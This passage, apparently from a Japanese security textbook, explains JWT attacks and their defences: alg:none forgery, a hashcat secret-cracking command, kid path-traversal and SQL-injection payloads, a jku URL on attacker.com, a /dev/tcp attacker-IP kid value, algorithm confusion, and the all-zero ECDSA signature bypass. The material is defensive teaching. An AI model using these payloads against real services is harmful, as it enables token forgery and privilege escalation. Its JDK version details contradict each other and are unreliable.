# 第2章 JWT攻撃


## JWT攻撃の基礎理解

### JWTとは何か

JWT（JSON Web Token）は、署名付きのJSONデータをシステム間でやり取りするための標準化フォーマットである。主に認証（authentication）、セッション管理、アクセス制御（authorization）の用途で使われる。

JWTの最大の特徴は「自己完結性（self-contained）」にある。セッションIDのようにサーバー側でストレージを引いて状態を確認する必要がなく、必要な情報がトークン自体に含まれている。このため、複数のサーバーやマイクロサービスをまたいでユーザーを認証する分散アーキテクチャと相性がよい。裏を返せば、トークンの中身と署名の正当性をサーバーが正しく検証しない限り、攻撃者は「自分に都合のよいJSON」を丸ごと偽造できてしまうという意味でもある。JWT攻撃の大半は、この「検証ロジックの欠陥」を突くものだと理解しておくと全体像がつかみやすい。

> 出典: PortSwigger: JWT attacks（概要） — https://portswigger.net/web-security/jwt

### JWTの構造

JWTは、ドット（`.`）で区切られた3つのBase64URLエンコード済みパートから構成される。

```
header.payload.signature
```

#### 1. ヘッダー（Header）

トークンのメタデータ、特に使用する署名アルゴリズムを示す。

```json
{ "alg": "HS256", "typ": "JWT" }
```

#### 2. ペイロード（Payload）

ユーザーに関する主張（claim）を格納する部分。

```json
{ "username": "carlos", "isAdmin": false, "email": "user@example.com" }
```

#### 3. 署名（Signature）

ヘッダーとペイロードを連結した文字列を秘密鍵でハッシュ化したもの。改ざん検知と真正性の証明を担う。

ここで重要なのは、ヘッダーとペイロードは**暗号化されているわけではなく、単にBase64URLエンコードされているだけ**という点である。つまり誰でもデコードして中身を読める（そしてブラウザの開発者ツールやCLIツールで簡単に書き換えられる）。JWTのセキュリティは「暗号化による秘匿」ではなく、「署名による改ざん検知」に依存している。したがって、サーバー側が署名検証を正しく行わない限り、攻撃者は好きなようにペイロードを書き換えられてしまう。

### JWT・JWS・JWEの違い

JWT仕様そのものは「情報表現フォーマット」しか定義していない。実装としては主に2種類が存在する。

- **JWS（JSON Web Signature）**: 最も一般的。ペイロードは平文のまま、暗号署名が付与される。
- **JWE（JSON Web Encryption）**: ペイロードの中身自体を暗号化し、機密性を確保する。

一般に「JWT」と呼ぶとき、実務上はJWSを指していることがほとんどである。以降、本節で扱う「JWT攻撃」は基本的にJWS形式のトークンを対象とする。

> 出典: PortSwigger: JWT attacks（概要） — https://portswigger.net/web-security/jwt

### 署名検証が果たす2つの役割

署名は次の2つの保護機能を提供する。

1. **改ざん検知**: ヘッダーやペイロードの1バイトでも変更すれば、署名は一致しなくなる。
2. **真正性の証明**: サーバーの秘密鍵（署名鍵）を知らない限り、正しい署名を生成することはできない。

しかし、これらの保護は「実装が正しく検証処理を行っている場合に限り」機能する。JWT攻撃の多くは、この検証処理の実装ミスや設計ミスを突くものであり、暗号アルゴリズム自体の脆弱性を突くわけではない。つまり「JWTというフォーマット自体が危険」なのではなく、「JWTを扱うサーバー側の検証コードが危険」なのだという視点が、この分野を学ぶ上での核心となる。

> 出典: PortSwigger: JWT attacks（概要） — https://portswigger.net/web-security/jwt

### 代表的な脆弱性パターン

#### 1. 署名検証をそもそも行っていない

Node.jsの`jsonwebtoken`ライブラリのように、検証を行う`verify()`と検証を行わない`decode()`の両方を提供しているライブラリがある。開発者が誤って（あるいはデバッグコードの消し忘れで）`decode()`のみを使ってしまうと、署名検証は一切行われないまま、ペイロードの中身がそのまま信頼されてしまう。

攻撃手順は単純で、有効なトークンを取得し、ペイロードのclaim（例: `role: "user"`）を`role: "admin"`のように書き換えて、再エンコードしてサーバーに送るだけである。署名が検証されないため、改ざんが検知されずに通ってしまう。

**なぜこれが起きるか**: JWTライブラリの多くは、デバッグ・ロギング目的でトークンの中身を確認するための「検証なしデコード関数」を用意している。これは本来トークンの中身を「見る」ためのユーティリティであり、認証判断に使ってはならない。しかしAPIの見た目が似ているため、開発者が誤用しやすい。

**対策**: 認証・認可の判断には必ず`verify()`系の関数を使う。誤用を防ぐための静的解析や、署名検証が強制されているかを確認する統合テストを組み込む。

> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide

#### 2. `alg: none`（none アルゴリズム）攻撃

JWTのヘッダーにある`alg`パラメータは、サーバーがどのアルゴリズムで署名検証すべきかを示す。ここに`"none"`を指定すると、そのトークンは「署名なし」を意味する。一部のライブラリは、デバッグ目的でこの`none`アルゴリズムをサポートしており、明示的に無効化していないと本番環境でも有効なまま残ってしまう。

攻撃の流れは以下のとおりである。

```json
// 元のヘッダー
{ "alg": "HS256", "typ": "JWT" }

// 書き換え後のヘッダー
{ "alg": "none", "typ": "JWT" }
```

ペイロードも自由に書き換え（例: `username: "joe"` → `username: "admin"`）、最後に署名部分を空にしたトークンを組み立てる。

```
<base64url(header)>.<base64url(payload)>.
```

**重要な注意点**: 署名なしトークンであっても、ペイロードの後に**必ずドット（`.`）を末尾に残す**必要がある。これはJWTのフォーマット上、3パート構成（ドット2つ）を維持しなければパースエラーになるためである。

サーバーは通常こうした明らかな`none`指定を拒否するようフィルタしているが、「大文字小文字を混在させる（`None`、`NONE`など）」「予期しないエンコーディングを使う」といった古典的な難読化テクニックで、そのフィルタを回避できる場合がある。PortSwiggerのKB（脆弱性タイプ`0x00200901`、CWE-345: データ真正性の検証不足に分類）では、この脆弱性を「重大度: 高（High）」としている。

**なぜこれが起きるか**: `none`アルゴリズムは元々JWT仕様（RFC 7519関連仕様群）で定義された正式な値であり、開発・テスト時にトークンの中身を素早く確認する目的で使われることがある。しかしライブラリ側でこれを許可アルゴリズムのデフォルトに含めたまま出荷してしまうと、本番でもそのまま動いてしまう。

**対策**:
- ライブラリ設定で`none`アルゴリズムを明示的に無効化する。
- 許可アルゴリズムのアローリスト（許可リスト）を厳格に設定する（例: RS256のみ、HS256のみ）。
- パース段階で`alg: none`を含むトークンを拒否する。

> 出典: PortSwigger: JWT none algorithm supported（KB） — https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported
> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide

#### 3. 弱い・ハードコードされたシークレット（総当たり攻撃）

HS256のような対称鍵アルゴリズムは、任意の文字列を秘密鍵（シークレット）として使う。開発者がデフォルト値・プレースホルダー・使い回しのシークレットをそのまま本番投入してしまうケースは珍しくなく、これは総当たり（ブルートフォース）攻撃の対象になる。

一般的な弱いシークレットの例としては、`"secret"`、`"123456"`、サービス名やプロジェクト名そのもの、ソースコードにハードコードされたデフォルト値などが挙げられる。

**Hashcatを使ったオフライン総当たり**

対称鍵アルゴリズムのシークレットは、`hashcat`のようなツールでワードリストを用いて効率的に検証できる。

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

`hashcat`はワードリストの各候補文字列でJWTに署名し、その結果をサーバーが発行した署名と比較する。一致すれば、`<jwt>:<特定されたシークレット>`という形式で出力される。

**なぜこの攻撃が成立するか**: この処理はオフラインで完結する。つまり、攻撃者は一度有効なJWTを1つ手に入れさえすれば、サーバーへの通信を一切行わずに手元で大量の候補を高速に試せる。レート制限やログ監視による検知を回避しやすい点が、オンライン型のパスワード総当たりとの大きな違いである。よく使われる資産として、既知の弱いJWTシークレットをまとめた[wallarm/jwt-secretsのワードリスト](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)がある。

シークレットの特定に成功すれば、攻撃者はそのシークレットを使って任意のclaim（例: 管理者権限フラグ）を持つ新しいトークンを自由に偽造できる。

**対策**:
- 暗号学的に強いシークレットを使う（最低32バイト以上のランダム値が目安）。
- シークレットをソースコードや設定ファイルに直接書かない（シークレット管理システムを利用する）。
- 定期的なシークレットローテーションを実施する。
- ローテーション中のダウンタイムを避けるため、複数シークレットの並行サポートを検討する。
- トークン検証エラーのログを監視する。

> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
> 出典: PortSwigger: JWT attacks（概要） — https://portswigger.net/web-security/jwt

#### 4. ヘッダーパラメータ・インジェクション

JWTヘッダーには、署名検証に使う鍵の場所や中身を示す複数のパラメータが存在し、これらを悪用したインジェクション攻撃が知られている。

##### `kid`（Key ID）パラメータ

`kid`は、サーバーが検証に使うべき鍵を特定するための識別子である。実装が甘い場合、この値がそのままファイルパスやSQLクエリに組み込まれてしまうことがある。

**パストラバーサルの例**:

```json
"kid": "../../../../dev/null"
```

サーバー側が`/keys/` + `kid`のようにパスを組み立てていた場合、結果的に`/keys/../../../../dev/null` → `/dev/null`という空ファイルを参照することになる。`/dev/null`は常に空（長さ0）なので、これを鍵として使うと「空文字列」がHMACシークレットとして扱われる。攻撃者は空文字列をシークレットとして自分でトークンに署名すればよく、サーバー側の検証を通過できてしまう。

**SQLインジェクションの例**:

```json
"kid": "zzzz' UNION SELECT '123' --"
```

`kid`の値がデータベースへの鍵引き当てクエリにそのまま連結されている場合、UNIONベースのSQLインジェクションによって攻撃者が指定した任意の値（この例では`123`）を鍵として使わせることができる。

**なぜこれが起きるか**: `kid`はJWT仕様上、単なる「識別子」であり中身の形式は規定されていない。そのため開発者は「ただの文字列キー」として気軽にファイルパスやSQLクエリに組み込んでしまいがちだが、実際には攻撃者が完全にコントロールできる外部入力である。

**対策**:
- `kid`の値は厳格に検証し、既知の値のみを許可するアローリスト方式（固定マッピング）を使う。
- `kid`を直接ファイルパスやSQLクエリに連結しない。
- パスを使う場合は正規化（canonicalize）してから比較する。
- SQLを使う場合はプレースホルダー（パラメータ化クエリ）を使う。
- 想定外の`kid`値をログに記録し監視する。

##### `jwk`（JSON Web Key）パラメータ

JWTヘッダーには、検証用の公開鍵そのものを埋め込む`jwk`パラメータが存在する。実装によっては、ヘッダーに埋め込まれた鍵を無条件に信頼して検証に使ってしまう。

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "..."
  }
}
```

攻撃者は自分でRSA鍵ペアを生成し、ペイロードを（例: `"user": "admin"`のように）改ざんした上で、この自作の公開鍵をヘッダーの`jwk`に埋め込み、対応する自作の秘密鍵で署名する。サーバーが「ヘッダーに書いてある鍵で検証すればいい」という実装になっていれば、攻撃者が完全にコントロールする鍵ペアでの署名がそのまま正当なものとして受理されてしまう。

**なぜこれが起きるか**: 本来、検証鍵は「サーバー側が事前に把握している、信頼できる鍵」でなければならない。しかし`jwk`ヘッダーは「トークンの送信者が自己申告する鍵」であり、これを無条件に信頼することは「自分で書いた署名を自分で正しいと証明する」のと同義になってしまう。この脆弱性はnode-joseライブラリにおいてCVE-2018-0114として報告された実例がある（該当バージョンは要確認。使用中のライブラリのアドバイザリで対象バージョンを必ず確認すること）。

**対策**:
- トークン自体に埋め込まれた鍵を検証に使わない。
- `jwk`のパースがどうしても必要な場合は、発行者・出どころ・用途（`"use": "sig"`など）を検証する。
- 明示的に必要でない限り`jwk`ヘッダーのパースを無効化する。
- CVE-2018-0114の影響を受けるライブラリはアップデートする。

##### `jku`（JWK Set URL）／`x5u`（X.509証明書URL）パラメータ

`jku`や`x5u`は、検証用の鍵（またはX.509証明書）を取得すべき外部URLをヘッダー内で指定するパラメータである。URLのドメイン検証が不十分だと、攻撃者は自分が管理するサーバーに鍵を置き、そのURLをトークンに指定することで、サーバーに攻撃者の鍵を「正しい検証鍵」として取得・信頼させることができる。

攻撃手順は次のとおりである。

1. 攻撃者が自分の鍵ペアを生成する。
2. 攻撃者が管理するサーバーに、その公開鍵をJWKセットまたはX.509証明書として公開する。
3. `"jku": "https://attacker.com/jwks.json"`（あるいは`x5u`にX.509証明書のURL）を指定したJWTを作成する。
4. 攻撃者の秘密鍵で署名する。
5. サーバーがそのURLから鍵を取得し、信頼してしまう。

このパラメータの悪用は、ファイルアップロード機能やヘッダーインジェクション、オープンリダイレクトなど、他の脆弱性と組み合わさることもある。また、サーバーが任意のURLへリクエストを送ってしまう構造そのものが、SSRF（サーバーサイドリクエストフォージェリ）のリスクにもつながる。

**対策**:
- 任意の`jku`/`x5u`からの鍵取得を信頼しない。
- 信頼できるドメインのアローリストを実装する。
- 取得した鍵が期待する`kid`と一致するか検証する。
- 想定外の外部鍵URLをログに記録・アラート対象とする。
- 可能な限りローカルに保持した鍵を優先し、動的な外部鍵取得が本当に必要な場合のみ許可する。

### アルゴリズム混同（Algorithm Confusion）攻撃

アルゴリズム混同攻撃は、JWT攻撃の中でも仕組みの理解が特に重要なテーマであり、独立した資料でも詳しく解説されている。

#### 対称鍵と非対称鍵の違い

- **対称鍵（HS256など）**: 1つの秘密鍵が署名にも検証にも使われる。この鍵は絶対に秘匿されなければならない。
- **非対称鍵（RS256など）**: 秘密鍵で署名し、公開鍵で検証する。公開鍵は広く配布されても問題ない設計になっている（署名の偽造には秘密鍵が必要なため）。

#### 脆弱性のメカニズム

多くのJWTライブラリは、「アルゴリズムに依存しない汎用的な検証メソッド」を提供している。つまり、開発者が「RS256を使うつもりで」検証コードを書いていても、実際にはトークンのヘッダーに書かれた`alg`の値をそのまま信用して、その通りのアルゴリズムで検証を行ってしまうライブラリが少なくない。

ここで攻撃者が`alg`を`RS256`から`HS256`に書き換えるとどうなるか。ライブラリの汎用`verify()`メソッドは、本来「RS256の公開鍵」として渡されたはずの値を、そのまま「HS256のHMACシークレット」として扱ってしまう。

> 「サーバーが対称アルゴリズム（HS256など）で署名されたトークンを受け取った場合、ライブラリの汎用verify()メソッドは公開鍵をHMACシークレットとして扱ってしまう。」

これにより攻撃者は、サーバーの公開鍵（本来は秘匿する必要がないので入手しやすい）を使ってHS256でトークンに署名し、サーバー側にそれを正規の署名として受理させることができる。

#### 攻撃手順

1. **公開鍵を入手する**: `/jwks.json`、`/.well-known/jwks.json`のような公開エンドポイント、あるいは既存のトークンから抽出する。
2. **フォーマットを一致させる**: 公開鍵を、サーバーが保持しているものとバイト単位で完全に一致する形式（典型的にはX.509 PEM形式）に変換する。改行コードなどの非表示文字も含め、完全一致させる必要がある。
3. **ペイロードを改ざんする**: 権限昇格などを狙った悪意あるclaimに書き換える。
4. **ヘッダーの`alg`を`HS256`に設定し、公開鍵をHMACシークレットとして署名する**。

```json
// 元のヘッダー（RS256、非対称）
{ "alg": "RS256", "typ": "JWT" }

// 攻撃者が書き換えた後のヘッダー（HS256、対称）
{ "alg": "HS256", "typ": "JWT" }
```

**なぜ「完全一致」が必要なのか**: HMACは入力鍵のバイト列全体をそのままハッシュ計算に使う。サーバーが保持する公開鍵の文字列表現（改行位置、末尾の空白、エンコード方式など）と1ビットでも異なれば、生成される署名がまったく変わってしまい、検証に失敗する。したがって攻撃者は、サーバーが実際に使っている鍵の「文字列としての見た目」を寸分違わず再現する必要がある。

#### ECDSA（ES256）版のアルゴリズム混同

RSAだけでなく、ECDSA（ES256など）を使うアプリケーションも同様の混同攻撃の対象になる。`alg`を`ES256`から`HS256`に書き換え、ECDSAの公開鍵をHMACシークレットとして使う点は同じ流れである。ECDSAの公開鍵は、フロントエンドのJavaScriptコード、モバイルアプリ内へのハードコード、公開ドキュメント、あるいは複数の署名から数学的に鍵候補を復元するツール（後述の`rsa_sign2n`など、ECDSA署名は1つの署名につき鍵候補が2つ存在する点に注意）から入手できる場合がある。

#### 公開鍵が公開されていない場合の鍵復元

公開鍵がどこにも公開されていない場合でも、複数の正規JWT（同じ鍵で署名された異なるトークン）のペアから、鍵の候補値を数学的に導出できるツールが存在する。代表例が`rsa_sign2n`である。これは、RSA署名の仕組み上、十分な数の（メッセージ, 署名）ペアがあれば、公開鍵の構成要素（モジュラスnなど）を逆算できる場合があるという性質を利用している。この手法は攻撃検証だけでなく、既知の脆弱性の再現テストにも使われる。

**対策**:
- `alg`ヘッダーの値をアルゴリズム選択の根拠として絶対に信用しない。
- 期待するアルゴリズムをサーバー側の設定でハードコードし、動的に切り替えない。
- トークンの「パース（内容を読む処理）」と「検証（署名を確認する処理）」を明確に分離し、パース結果を検証ロジックの入力として自動選択させない。
- 鍵の種類（対称/非対称）ごとに検証関数を明示的に分け、混同できないライブラリ構成を選ぶ。

> 出典: PortSwigger: Algorithm confusion attacks — https://portswigger.net/web-security/jwt/algorithm-confusion
> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide

### 補足: 実装依存の既知の脆弱性（CVE-2022-21449 「Psychic Signature」）

これはJWTの仕様自体の欠陥ではなく、特定の暗号ライブラリ実装のバグだが、JWT検証の文脈で重要な教訓を与える事例として紹介する。

Java（OpenJDK）の一部バージョンにおいて、ECDSA署名の検証処理に実装バグがあり、「r=0かつs=0」という本来無効なはずの署名値を、有効な署名として受理してしまう欠陥が存在した。攻撃者は`"alg": "ES256"`を指定した任意のペイロードのJWTに対して、Base64URLエンコードで`MAYCAQACAQA`となるような「オール0」の署名を付与するだけで、脆弱なJavaサービス上の検証をすり抜けることができた。

**影響を受けたバージョン**: パッチ適用前のJDK 17.0.3、11.0.15、8u331など（正確な対象バージョンは公式のセキュリティアドバイザリで確認すること。2022年4月にJDK側で修正済み）。

**なぜこれが起きるか**: ECDSA署名検証アルゴリズムの実装において、署名値`(r, s)`のどちらか、あるいは両方が0であるという異常なケースの入力チェックが漏れていた。本来、暗号ライブラリは数学的に無効な入力（0を含む）を早期に拒否すべきだが、このチェックが欠落していたため、検証ロジックが誤って「一致」と判定してしまう経路が存在した。

**教訓**: JWT自体の設計やHS256/RS256といったアルゴリズム選択が正しくても、それを実際に計算する暗号ライブラリの実装にバグがあれば、署名検証はまるごと無力化されうる。したがって、使用している言語・ランタイム・暗号ライブラリのバージョンを常に最新のセキュリティパッチが適用された状態に保つことが、JWT攻撃対策の見落とされがちな一部である。

**対策**:
- 影響を受けるJavaのバージョンをパッチ済みバージョン（JDK 17.0.3以降、11.0.15以降、8u331以降など）にアップデートする。
- 信頼性の低い、あるいはメンテナンスが止まっている暗号ライブラリでのECDSA利用を避ける。
- 「rおよびsが両方とも0」のような、明らかに不審な署名値を拒否するテストケースを検証スイートに含める。

> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide

### 検証・監査における実務上の注意点

複数のマイクロサービスがそれぞれ別々のJWTライブラリ、鍵、検証ロジックを使っている環境では、「あるサービスで安全な実装になっているからといって、他のサービスも安全とは限らない」という点に注意が必要である。エンドポイントごとに個別にJWT検証の実装を確認する必要がある。

確認すべき主な観点は以下のとおりである。

- 署名検証が確実に強制されているか（`decode()`のみで済ませていないか）。
- アルゴリズムが制限されているか（`none`が許可されていないか、動的なアルゴリズム切り替えを許していないか）。
- 検証鍵の出どころが正しく制限されているか（ヘッダー由来の鍵をそのまま信用していないか、`jku`/`x5u`にアローリストがあるか）。
- インジェクションポイント（`kid`、`jku`、`x5u`、`jwk`）が適切にサニタイズされているか。
- HMACシークレットの強度が十分か（総当たり耐性があるか）。

> 出典: PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide

### 防御側のまとめ

本節で扱った攻撃はいずれも、「JWTという仕組みそのもの」ではなく「検証実装の欠陥」に起因する。防御側が押さえるべき基本方針は次のとおりである。

- 最新のJWTライブラリを使用し、開発者がセキュリティ上の含意を理解した上で実装する。
- 想定外のアルゴリズムを考慮した、厳格な署名検証を実装する。
- `jku`のドメインを厳格にアローリスト化する。
- `kid`パラメータをパストラバーサルやSQLインジェクションの観点で検証する。
- 発行するすべてのトークンに有効期限（`exp`claim）を設定する。
- トークンをURLに含めて送信しない（ログや履歴に残るリスクを避ける）。
- 想定される受信者を示す`aud`（audience）claimを含める。
- サーバー側でのトークン失効（ログアウト機能）を実装する。

なお、Burp Suite Professional（バージョン2022.5.1以降）にはJWT脆弱性を自動検出する機能が搭載されており、JWT Editor拡張機能を使うと、`jwk`インジェクションなどのヘッダー改ざん攻撃を、鍵の自動生成・埋め込みを含めて効率的に検証できる。ただし、これらのツールは防御目的の検証・監査で使うものであり、権限のない実サービスや本番環境に対して無許可で実行してはならない。

> 出典: PortSwigger: JWT attacks（概要） — https://portswigger.net/web-security/jwt

## 日本語で学ぶJWTセキュリティ

JWT（JSON Web Token）は、認証・認可の文脈で最も広く使われているトークン形式の一つです。ステートレスであることの利便性ゆえに、SPA、モバイルアプリ、マイクロサービス間通信など幅広い場面で採用されていますが、その一方で「検証の実装が正しくなければ、署名付きトークンであっても容易に偽造されうる」という危険な性質を持ちます。本節では、JWTの内部構造を踏まえたうえで、実際に悪用される代表的な攻撃手法と、それぞれがなぜ成立するのかという仕組みレベルの原理、そして防御側が取るべき対策を解説します。読者は認証の基礎（セッション管理・パスワード認証など）は既知として、JWT固有の落とし穴に焦点を当てます。

### JWTの構造とその意味

JWTは `Header.Payload.Signature` という3つの部分をピリオドで連結し、それぞれをBase64URLエンコードした文字列です。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

- **ヘッダ（Header）**: `alg`（署名アルゴリズム）や `typ`（トークン種別）、`kid`（鍵ID。複数鍵を運用する場合にどの鍵で署名したかを示す識別子）などのメタ情報を含みます。
- **ペイロード（Payload）**: `sub`（主体、通常はユーザーID）、`exp`（有効期限）、`iat`（発行日時）などの予約クレームと、アプリケーション固有のクレーム（例: `role`, `admin`）を含みます。
- **署名（Signature）**: ヘッダとペイロードを連結した文字列に対して、指定アルゴリズムと鍵で計算されるMAC（メッセージ認証コード）または電子署名です。改ざん検知の要となります。

ここで押さえておくべき最重要ポイントは、**ペイロードは暗号化されていない**ということです。Base64URLは単なるエンコーディングであり、暗号ではありません。誰でもデコードして中身を読めるため、機密情報（パスワード、内部ID、DB名など）をペイロードに入れてはならず、また「見えても構わないが改ざんされては困る」情報の完全性を守るのが署名の役割だという点を理解しておく必要があります。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security

### 攻撃1: `alg: none` によるトークン偽造

JWTの仕様（RFC 7519 / JWA: RFC 7518）には、署名アルゴリズムとして文字通り「署名なし」を意味する `none` が定義されています。これは主に「署名済みJWTを受け取ったあと、内容だけを転記して未署名のまま扱いたい」といったニッチな用途のために存在しますが、検証側の実装がここを正しく制限していないと致命的な脆弱性になります。

**攻撃の流れ:**

```json
// 元のヘッダ
{"alg": "HS256", "typ": "JWT"}

// 攻撃者が書き換えたヘッダ
{"alg": "none", "typ": "JWT"}
```

ペイロードも自由に書き換えます。

```json
{"sub": "1234567890", "name": "attacker", "admin": true}
```

署名部分は空文字列にし、最後のピリオドだけを残した `header.payload.` という形でサーバーに送信します。

**なぜ成立するのか（仕組みレベル）:**
多くのJWTライブラリは、検証時に「トークン自身が名乗っているヘッダの `alg` 値」を読み取り、その値に従って検証ロジックを分岐させる設計になっていました。サーバー側のコードが「`alg` が `none` なら署名検証をスキップする」という分岐を持っていたり、あるいはアルゴリズムのホワイトリストを一切設けずライブラリのデフォルト挙動に任せていたりすると、攻撃者が自分でヘッダの `alg` を `none` に書き換えるだけで、サーバーに「これは検証不要なトークンだ」と誤認させ、署名検証そのものを回避できてしまいます。結果として、ペイロード中の `admin: true` のような権限クレームがそのまま信頼され、権限昇格が成立します。

**対策:**
- サーバー側の検証関数を呼び出す際に、**受理するアルゴリズムを明示的にホワイトリスト指定**する（例: `["RS256"]` のみを許可し、それ以外は例外として拒否する）。
- トークンが自己申告する `alg` の値を無条件に信用しない設計にする。

### 攻撃2: 鍵混同攻撃（RS256 → HS256 アルゴリズム置換）

これはJWT攻撃の中でもとりわけ本質的で、暗号方式の性質差を突く攻撃です。

**前提知識:**
- **RS256（RSA + SHA-256）**は非対称アルゴリズムです。サーバーは**秘密鍵**で署名を生成し、**公開鍵**で検証します。公開鍵は名前の通り公開されていても安全という前提の暗号方式です（例えば `/.well-known/jwks.json` のようなエンドポイントで配布されることもあります）。
- **HS256（HMAC + SHA-256）**は対称アルゴリズムです。署名の生成と検証を**同一の秘密鍵（共通鍵）**で行います。つまりHS256の世界では、「検証に使う鍵を知っている者は、署名の生成もできる」という等価性が成り立ちます。

**攻撃の流れ:**
1. 攻撃者は、サーバーがRS256の検証に使っている公開鍵を入手します（公開鍵自体は本来「公開」されていて構わないものなので、正規の配布エンドポイントや証明書から容易に手に入ることが多いです）。
2. 攻撃者はヘッダの `alg` を `RS256` から `HS256` に書き換えます。
3. 攻撃者は、入手した**RS256の公開鍵の文字列そのものをHS256の共通鍵として扱い**、任意に改ざんしたペイロード（例: `role: admin`）に対してHMAC-SHA256で署名を計算し直します。

```json
// 偽装ヘッダ
{"alg": "HS256", "typ": "JWT"}
```

**なぜ成立するのか（仕組みレベル）:**
検証側のライブラリ実装が「ヘッダの `alg` フィールドを読み取り、それに応じて検証アルゴリズムを動的に切り替える」という設計になっている場合が問題の核心です。サーバーは本来RS256（公開鍵検証）を意図してコーディングしていても、渡されたトークンのヘッダが `HS256` を名乗っていると、ライブラリはHMAC検証ルーチンに入り、「検証用の鍵」としてサーバーに設定されている値（＝本来はRS256の公開鍵）をHMACの共通鍵として使ってしまいます。攻撃者はまさにその同じ公開鍵を使ってHMAC署名を計算しているため、両者は一致し、検証が通ってしまいます。つまり、**「鍵の用途（公開鍵か共通鍵か）」という文脈情報をアルゴリズムと紐付けずに、トークン側の自己申告だけで解釈してしまう実装上の混同**が根本原因です。

**対策:**
- 検証時に使用するアルゴリズムをサーバー側の設定として固定し、**トークンの `alg` ヘッダに検証ロジックを委ねない**。
- 鍵ごとに用途（RS256用の公開鍵、HS256用の共通鍵など）を明確に分離し、検証関数に渡す鍵とアルゴリズムの組み合わせを許可リスト化する。
- 主要なJWTライブラリ（PyJWT, jsonwebtoken等）は近年この問題への対策として、検証時に許容アルゴリズムを明示的に渡すAPI設計に改められています。ライブラリのバージョンが古い場合は特に注意が必要です。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security
> 出典: JWTセキュリティ入門（Speaker Deck / melonattacker） — https://speakerdeck.com/melonattacker/jwtsekiyuriteiru-men
> 出典: OWASP Authentication Threats for JSON Web Token（Akamai） — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token

### 攻撃3: 弱い署名鍵とブルートフォース／クラック

HS256などの対称アルゴリズムを使う場合、署名の安全性は完全に共通鍵の強度（長さとランダム性、すなわちエントロピー）に依存します。

**脅威の実態（数値で見る危険性）:**
Akamaiのブログでは、GPU性能の向上によって鍵クラックが年々高速化している実態が示されています。8文字の秘密鍵のクラック所要時間は数年前の10.5日から、現在では4.5日にまで短縮されており、7文字の鍵に至っては90分以下でクラック可能になっているとされています（この数値はGPU計算資源のコモディティ化を背景としており、今後さらに短縮されていくと見るべきです）。この種のオフライン攻撃（サーバーに実際にリクエストを送らず、手元でハッシュ計算だけを繰り返す攻撃）は、サーバー側のレート制限やアカウントロックといった通常の防御が一切機能しないという点で特に厄介です。

**攻撃ツールの例:**
`jwt_tool`、`jwtcrack`、`John the Ripper`(JWT対応モジュール) などが、辞書攻撃・総当たり攻撃によって共通鍵の推測に使われます。鍵が判明すれば、攻撃者は任意のペイロードで正規の署名を生成できるようになり、実質的に「なりすまし放題」の状態になります。

**対策:**
- RFC 7518では、HMACに使用する鍵は**256ビット（32文字相当）以上**にすべきと規定されています。これを下回る短い鍵は仕様上非推奨とされているにもかかわらず、実装ミスや設定ファイルへの安易な固定文字列（`"secret"` など）の使用で発生しがちです。
- 可能であれば対称アルゴリズム（HS256）ではなく、非対称アルゴリズム（RS256、あるいはより望ましいECDSAベースのES256）への移行を検討する。非対称方式では検証鍵（公開鍵）が漏れても署名鍵（秘密鍵）は安全なままであり、対称鍵のような「知られたら即終わり」という単一障害点になりにくい構造上の利点があります。
- 鍵はCSPRNG（暗号論的に安全な乱数生成器）で生成し、設定管理やシークレットマネージャで厳格に管理する。

> 出典: OWASP Authentication Threats for JSON Web Token（Akamai） — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token
> 出典: JWTセキュリティ入門（Speaker Deck / melonattacker） — https://speakerdeck.com/melonattacker/jwtsekiyuriteiru-men

### 攻撃4: `kid`（Key ID）クレームの悪用

`kid` は、サーバーが複数の鍵をローテーション運用している場合に「このトークンはどの鍵で署名されたか」を示すヒントとしてヘッダに含めるクレームです。この値をサーバー側が鍵取得のロジックに直接使ってしまう実装は、深刻な脆弱性を招きます。

**手法A: ファイルパスの推測とアクセス**
サーバー実装が `kid` の値をそのままファイル名やパスの一部として使い、対応する鍵ファイルを読み込むような設計になっている場合、`kid` に `"../../../etc/passwd"` のようなディレクトリトラバーサル文字列を注入されると、本来意図しないファイル（システムファイルなど）を鍵として読み込ませることができます。

```json
{"alg": "HS256", "typ": "JWT", "kid": "../../../etc/passwd"}
```

**なぜ成立するのか:** サーバーが `kid` の値をパス構築に使う際、パス検証（正規化やホワイトリストチェック）を行わずにファイルシステムアクセス関数へそのまま渡していると、パストラバーサルが成立します。さらに、`/etc/passwd` のような**内容が既知・予測可能なファイル**を読み込ませたうえで、攻撃者がそのファイル内容をHS256の共通鍵として使って署名を偽造すれば、鍵混同攻撃と同様の権限昇格が可能になります（読み込まれたファイルの内容がそのままHMAC鍵として使われる場合）。

**手法B: SSRFへの応用**
`kid` に `"/dev/tcp/<攻撃者IP>/<ポート>/"` のような値や、外部URLを注入し、サーバーに外部通信を発生させようとする亜種も存在します。これは鍵取得ロジックがネットワーク越しの参照（後述のJWK/JKUヘッダの悪用とも関連）を許してしまっている場合に成立します。

**対策:**
